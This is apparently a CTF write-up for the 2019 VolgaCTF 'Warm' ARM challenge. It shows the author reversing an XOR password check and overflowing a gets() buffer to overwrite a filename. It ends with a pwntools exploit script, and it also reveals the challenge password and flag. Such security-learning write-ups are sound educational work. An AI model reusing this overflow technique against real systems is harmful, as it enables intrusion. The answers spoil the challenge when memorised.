# Warm

This is a 100-point pwnable problem from the 2019 Volga CTF Quals.


# Reconnaissance


### The problem statement

```
How fast can you sove it? nc warm.q.2019.volgactf.ru 443
```

It's a 32-bit ARM executable with all protections enabled.

Opening up in IDA Pro gives a helpful tip:
```
ARM AND THUMB MODE SWITCH INSTRUCTIONS

This processor has two instruction encodings: ARM and THUMB.
IDA allows to specify the encoding mode for every single instruction.
For this IDA uses a virtual register T. If its value is zero, then
the ARM mode is used, otherwise the THUMB mode is used.
You can change the value of the register T using
the 'change segment register value' command
(the canonical hotkey is Alt-G)
```

So it looks like I'm working with THUMB mode for exploitation?

Running it on the server shows I get prompted repeatedly for a password. The looping suggests that I leak an address...

I found a function that seems to check the password by browsing around in IDA, but I'm not so familiar with ARM assembly instructions so I can't read the assembly directly. As a result I tried decompiling with Ghidra:

```
if (sVar1 < 0x10) {
  uVar2 = 1;
}
else {
  if (((((*pbParm1 == 0x76) && ((pbParm1[1] ^ *pbParm1) == 0x4e)) &&
       ((pbParm1[2] ^ pbParm1[1]) == 0x1e)) &&
      ((((pbParm1[3] ^ pbParm1[2]) == 0x15 && ((pbParm1[4] ^ pbParm1[3]) == 0x5e)) &&
       (((pbParm1[5] ^ pbParm1[4]) == 0x1c &&
        (((pbParm1[6] ^ pbParm1[5]) == 0x21 && ((pbParm1[7] ^ pbParm1[6]) == 1)))))))) &&
     (((pbParm1[8] ^ pbParm1[7]) == 0x34 &&
      ((((((pbParm1[9] ^ pbParm1[8]) == 7 && ((pbParm1[10] ^ pbParm1[9]) == 0x35)) &&
         ((pbParm1[0xb] ^ pbParm1[10]) == 0x11)) &&
        (((pbParm1[0xc] ^ pbParm1[0xb]) == 0x37 && ((pbParm1[0xd] ^ pbParm1[0xc]) == 0x3c)))) &&
       (((pbParm1[0xe] ^ pbParm1[0xd]) == 0x72 && ((pbParm1[0xf] ^ pbParm1[0xe]) == 0x47)))))))) {
    uVar2 = 0;
  }
  else {
    uVar2 = 2;
  }
}
return uVar2;
```

This looks great! I should be able to reverse engineer this logic to get the password back.

A quick Python script does the trick:
```
ct = [0x76,0x4e,0x1e,0x15,0x5e,0x1c,0x21,0x01,0x34,0x07,0x35,0x11,0x37,0x3c,0x72,0x47]
result = 0x76
print(chr(result))
for i in range(1,16):
	print(chr(ct[i]^result))
	result = ct[i]^result
```
That gives me `v8&3mqPQebWFqM?x`. Now the program prompts:

`Seek file with something more sacred!`

So the password works, great! Next reversing step.
Wait, that's the end of the file, the file that gets opened contains the string `Seek file with something more sacred!`.

Okay, I get it, `gets` gets called to read in the password. So, if I enter the incorrect password, the program loops back to reading the password in again, but if I enter the correct one, I can follow it with an arbitrary number of characters and execute a buffer overflow.

Example:

```
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Unable to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA file!
Hi there! I've been waiting for your password!
```

Okay, I just need to get it to open a "flag" file. Quick detour to using `pwnlib`.

A new string:
`v8&3mqPQebWFqM?xaBCDEFGHbBCDEFGHcBCDEFGHdBCDEFGHeBCDEFGHfBCDEFGHgBCDEFGHhBCDEFGHiBCDEFGHjBCDEFGHkBCDEFGHlBCDEFGHmBCDEFGHnBCDEFGHoBCDEFGHpBCDEFGHqBCDEFGHrBCDEFGHsBCDEFGHtBCDEFGH`
yields
`Unable to open EFGHlBCDEFGHmBCDEFGHnBCDEFGHoBCD file!`

Now I send
`v8&3mqPQebWFqM?xaBCDEFGHbBCDEFGHcBCDEFGHdBCDEFGHeBCDEFGHfBCDEFGHgBCDEFGHhBCDEFGHiBCDEFGHjBCDEFGHkBCDflag`

which gives me
`Seek file with something more sacred!`

What else might be in that directory?

`v8&3mqPQebWFqM?xaBCDEFGHbBCDEFGHcBCDEFGHdBCDEFGHeBCDEFGHfBCDEFGHgBCDEFGHhBCDEFGHiBCDEFGHjBCDEFGHkBCDwarm`

gives me the executable, that's pretty cool.

Well, how about "sacred"?

`v8&3mqPQebWFqM?xaBCDEFGHbBCDEFGHcBCDEFGHdBCDEFGHeBCDEFGHfBCDEFGHgBCDEFGHhBCDEFGHiBCDEFGHjBCDEFGHkBCDsacred`

yields

`VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}`

That works for me! It's straying towards "guessing" problem territory, but the guess wasn't too difficult.

Here's the exploit code:

```
#exploit-warm.py

from pwn import *
from time import sleep

p = remote('warm.q.2019.volgactf.ru',443)

payload = ''
payload += 'v8&3mqPQebWFqM?x'
for i in range(0, 10):
	payload += chr(0x61 + i) + 'BCDEFGH'
payload += 'kBCD'
payload += 'sacred'
payload += '\n'
#log.info(payload)
p.send(payload)
p.interactive()
```

### Comparison to other approaches

Every write-up on CTF Time uses Ghidra and guesses `sacred`. It seems that I took the standard approach.
